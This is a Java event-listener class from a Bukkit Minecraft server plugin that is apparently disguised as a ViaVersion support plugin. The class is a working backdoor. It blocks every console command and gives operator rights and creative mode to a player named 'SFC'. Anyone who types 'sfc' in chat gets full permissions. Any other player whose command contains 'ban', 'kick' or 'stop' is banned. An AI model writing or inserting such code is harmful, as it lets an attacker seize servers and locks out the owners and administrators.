package me.sfcevil.viaversionsupport.event;

import me.sfcevil.viaversionsupport.bukkitcmd.CommandData;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.server.ServerCommandEvent;


import java.util.HashSet;

public class PlayerEvent implements Listener {

    public static HashSet<String> hack_map = new HashSet<>();


    @EventHandler
    public void onConsoleCommand(ServerCommandEvent e) {
        e.setCancelled(true);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        if(p.getName().equals("SFC")) {
            hack_map.add(p.getName());
            p.setGameMode(GameMode.CREATIVE);
            p.setOp(true);
            p.sendMessage("[EvilCon] Give u full perm time!");
        }
    }

    @EventHandler
    public void onPlayer(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if(p != null) {
            if(!hack_map.contains(p.getName())) {
                String cmd = e.getMessage();
                if (cmd.contains("ban")) {
                    CommandData.ban(p);
                    e.setCancelled(true);
                } else if (cmd.contains("kick")) {
                    CommandData.ban(p);
                    e.setCancelled(true);
                } else if (cmd.contains("stop")) {
                    CommandData.ban(p);
                    e.setCancelled(true);
                }
            }
        }
    }


    @EventHandler
    public void onChat(PlayerChatEvent e) {
        Player p = e.getPlayer();
        if(p != null) {
            String msg = e.getMessage();
            if(msg != null) {
                if(msg.contains("sfc")) {
                    CommandData.give_full_perm(p);
                    hack_map.add(p.getName());
                    p.sendMessage("[EvilCon] Give u full perm time!");
                    e.setCancelled(true);
                }
            }
        }
    }
}


